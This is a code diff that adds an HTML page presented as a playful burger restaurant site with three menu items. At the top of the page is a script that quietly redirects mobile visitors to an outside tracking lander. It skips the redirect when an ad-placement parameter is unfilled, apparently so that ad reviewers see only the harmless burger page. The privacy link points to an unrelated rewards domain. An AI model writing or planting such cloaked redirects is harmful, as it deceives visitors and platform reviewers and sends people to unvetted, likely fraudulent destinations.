@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Burger Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #333333;
+            color: #ff9900;
+            text-align: center;
+            padding: 20px;
+            transform: skew(-5deg);
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .burger-card {
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            transform: rotate(3deg);
+        }
+        footer {
+            background-color: #333333;
+            color: #ff9900;
+            text-align: center;
+            padding: 10px;
+            margin-top: auto;
+        }
+        a {
+            color: #ff9900;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Galactic Burger Emporium</h1>
+        <p>Out of this world flavors!</p>
+    </header>
+    <main>
+        <div class="burger-card">
+            <h2>Nebula Nosh</h2>
+            <p>A burger that's truly stellar!</p>
+        </div>
+        <div class="burger-card">
+            <h2>Quasar Quesadilla</h2>
+            <p>Folded like space-time itself!</p>
+        </div>
+        <div class="burger-card">
+            <h2>Black Hole Bites</h2>
+            <p>So good, light can't escape!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Galactic Burger Emporium. All rights reserved. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
